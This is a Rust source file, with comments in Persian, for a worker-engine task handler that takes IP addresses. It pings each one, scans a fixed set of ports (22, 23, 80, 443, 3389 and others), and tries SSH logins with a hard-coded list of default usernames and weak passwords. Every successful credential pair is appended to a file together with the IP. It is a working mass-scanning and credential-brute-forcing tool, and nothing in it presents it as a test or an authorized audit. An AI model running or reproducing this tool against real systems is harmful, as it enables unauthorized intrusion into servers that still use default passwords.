use crate::worker_engine::TaskHandler;
use anyhow::Result;
use log::{info, error};
use std::fs::OpenOptions;
use std::io::Write;
use std::net::{SocketAddr, TcpStream};
use std::process::Command;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use rand::Rng;
use ssh2::Session;

pub struct AppTaskHandler {
    safe_ping_file: String,
    safe_socket_file: String,
    safe_ssh_file: String,
}

impl AppTaskHandler {
    pub fn new(safe_ping_file: String, safe_socket_file: String, safe_ssh_file: String) -> Self {
        Self {
            safe_ping_file,
            safe_socket_file,
            safe_ssh_file,
        }
    }

    async fn ping_test(&self, ip: String) -> Result<()> {
        // کمی تاخیر تصادفی
        let delay = rand::thread_rng().gen_range(0..1000);
        sleep(Duration::from_millis(delay)).await;

        // اجرای دستور ping (Linux)
        let output = tokio::task::spawn_blocking({
            let ip = ip.clone();
            move || {
                Command::new("ping")
                    .arg("-c")
                    .arg("2")
                    .arg("-W")
                    .arg("5")
                    .arg(&ip)
                    .output()
            }
        })
        .await??;

        if output.status.success() {
            // ذخیره IP موفق
            if let Ok(mut file) = OpenOptions::new()
                .create(true)
                .append(true)
                .open(&self.safe_ping_file)
            {
                writeln!(file, "{}", ip)?;
            }
            info!("IP is available (ping): {}", ip);
        }

        Ok(())
    }

    async fn socket_test(&self, ip: String) -> Result<()> {
        // کمی تاخیر تصادفی
        let delay = rand::thread_rng().gen_range(0..1000);
        sleep(Duration::from_millis(delay)).await;

        let ports = vec![13, 22, 23, 80, 443, 3389];
        
        for port in ports {
            let addr = format!("{}:{}", ip, port);
            
            // تست اتصال TCP
            let result = tokio::task::spawn_blocking({
                let addr = addr.clone();
                move || {
                    if let Ok(parsed_addr) = addr.parse::<SocketAddr>() {
                        TcpStream::connect_timeout(&parsed_addr, Duration::from_secs(1))
                    } else {
                        Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid address"))
                    }
                }
            })
            .await?;

            if result.is_ok() {
                // ذخیره IP:Port موفق
                if let Ok(mut file) = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&self.safe_socket_file)
                {
                    writeln!(file, "{}:{}", ip, port)?;
                }
                info!("IP is available (socket): {}:{}", ip, port);
            }
        }

        Ok(())
    }

    async fn ssh_test(&self, ip: String) -> Result<()> {
        // کمی تاخیر تصادفی
        let delay = rand::thread_rng().gen_range(0..1000);
        sleep(Duration::from_millis(delay)).await;

        let port = 22;
        let usernames = vec!["root", "admin", "user", "ubuntu"];
        let passwords = vec!["root", "admin", "123456", "password", "1234", ""];
        
        let addr = format!("{}:{}", ip, port);
        
        // تست اتصال SSH
        let result = tokio::task::spawn_blocking({
            let ip = ip.clone();
            let safe_ssh_file = self.safe_ssh_file.clone();
            move || -> Result<bool> {
                if let Ok(parsed_addr) = addr.parse::<SocketAddr>() {
                    // ابتدا بررسی می‌کنیم که پورت 22 باز است یا نه
                    let tcp = match TcpStream::connect_timeout(&parsed_addr, Duration::from_secs(2)) {
                        Ok(stream) => stream,
                        Err(_) => return Ok(false),
                    };
                    
                    // تلاش برای اتصال SSH
                    let mut sess = Session::new()?;
                    sess.set_timeout(3000);
                    sess.set_tcp_stream(tcp);
                    
                    if let Err(_) = sess.handshake() {
                        return Ok(false);
                    }
                    
                    // تست username/password های مختلف
                    for username in &usernames {
                        for password in &passwords {
                            if let Ok(_) = sess.userauth_password(username, password) {
                                if sess.authenticated() {
                                    // ذخیره SSH موفق
                                    if let Ok(mut file) = OpenOptions::new()
                                        .create(true)
                                        .append(true)
                                        .open(&safe_ssh_file)
                                    {
                                        writeln!(file, "{}:{}:{}:{}", ip, port, username, password)?;
                                    }
                                    info!("SSH connection successful: {}:{}@{}", username, port, ip);
                                    return Ok(true);
                                }
                            }
                        }
                    }
                }
                Ok(false)
            }
        })
        .await?;
        
        result?;
        Ok(())
    }
}

#[async_trait::async_trait]
impl TaskHandler for AppTaskHandler {
    async fn handle(&self, ip: String) -> Result<()> {
        let start = Instant::now();
        
        // اجرای همزمان همه تست‌ها
        let ping_future = self.ping_test(ip.clone());
        let socket_future = self.socket_test(ip.clone());
        let ssh_future = self.ssh_test(ip.clone());
        
        let (ping_result, socket_result, ssh_result) = tokio::join!(ping_future, socket_future, ssh_future);
        
        if let Err(e) = ping_result {
            error!("Ping test error for {}: {}", ip, e);
        }
        
        if let Err(e) = socket_result {
            error!("Socket test error for {}: {}", ip, e);
        }
        
        if let Err(e) = ssh_result {
            error!("SSH test error for {}: {}", ip, e);
        }
        
        let elapsed = start.elapsed();
        info!("Task-{} completed in {:.2}s", ip, elapsed.as_secs_f64());
        
        Ok(())
    }
}
